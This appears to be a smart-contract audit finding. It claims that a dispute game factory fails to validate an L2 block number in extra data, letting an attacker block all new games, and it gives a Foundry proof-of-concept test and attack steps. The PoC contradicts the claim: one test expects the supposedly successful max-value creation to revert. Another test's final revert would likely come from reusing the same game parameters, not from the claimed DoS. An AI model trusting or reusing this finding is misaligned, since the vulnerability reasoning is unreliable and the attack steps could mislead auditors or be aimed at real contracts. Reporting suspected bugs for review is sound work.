# Vulnerability details

## Vulnerability Details

The contract is designed to facilitate the creation of IDisputeGame instances and a critical part of this process involves specifying an l2BlockNumber, which represents the L2 block number against which the dispute game will be created. and there is an absence of validation for l2BlockNumber that is allows it to be set to extremely high values as type(uint256).max. and this can be exploited to cause a a DoS attack, preventing the creation of any new dispute games here is the vulenrbale line : 
```solidity
proxy_ = IDisputeGame(address(impl).clone(abi.encodePacked(msg.sender, _rootClaim, parentHash, _extraData)));
proxy_.initialize{ value: msg.value }();

// Compute the unique identifier for the dispute game.
Hash uuid = getGameUUID(_gameType, _rootClaim, _extraData);
```
the issue is arises because _extraData can contain any value, including type(uint256).max, for l2BlockNumber, which can then be used to create a game that effectivelyp revents any new games from being created.
## Impact
the issue it allows a malicious actor to set the l2BlockNumber to an excessively high value and this prevents any new dispute games from being created as future games must reference a higher block number this causes a DoS attack ,

```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../src/DisputeGameFactory.sol";

contract DisputeGameFactoryTest is Test {
    DisputeGameFactory factory;
    address alice = address(0x1);
    address bob = address(0x2);

    function setUp() public {
        factory = new DisputeGameFactory();

        factory.setImplementation(GameType.wrap(0), address(new MockDisputeGame()));
        factory.setInitBond(GameType.wrap(0), 1 ether);
    }

    function testCreateGameWithMaxBlockNumber() public {
        vm.deal(alice, 10 ether);
        vm.prank(alice);

        bytes memory extraData = abi.encode(type(uint256).max);
        vm.expectRevert();

        factory.create{value: 1 ether}(GameType.wrap(0), Claim.wrap(bytes32(uint256(1))), extraData);
    }

    function testDoSWithMaxBlockNumber() public {
        vm.deal(alice, 10 ether);
        vm.prank(alice);

        // Create a valid game
        bytes memory validExtraData = abi.encode(100);
        factory.create{value: 1 ether}(GameType.wrap(0), Claim.wrap(bytes32(uint256(1))), validExtraData);

        // Try to create a new game with a high l2BlockNumber
        bytes memory maxBlockExtraData = abi.encode(type(uint256).max);
        vm.prank(alice);
        vm.expectRevert();
        factory.create{value: 1 ether}(GameType.wrap(0), Claim.wrap(bytes32(uint256(1))), maxBlockExtraData);

        // Try to create a new game with a valid l2BlockNumber
        vm.prank(bob);
        vm.deal(bob, 10 ether);
        vm.expectRevert();
        factory.create{value: 1 ether}(GameType.wrap(0), Claim.wrap(bytes32(uint256(1))), validExtraData);
    }
}

contract MockDisputeGame {
    function initialize() external payable {
        // Mock implementation
    }
}

```

- as an Attack Vector :

- let's say A malicious actor calls the create function with l2BlockNumber set to an extremely high value within _extraData.
- The create function processes the request without validating the l2BlockNumber.
- The game is created with the high l2BlockNumber and stored in the _disputeGames mapping and _disputeGameList array.
- Subsequent attempts to create new dispute games will fail as they must reference a block number higher than the previously set maximum, effectively causing a DoS.
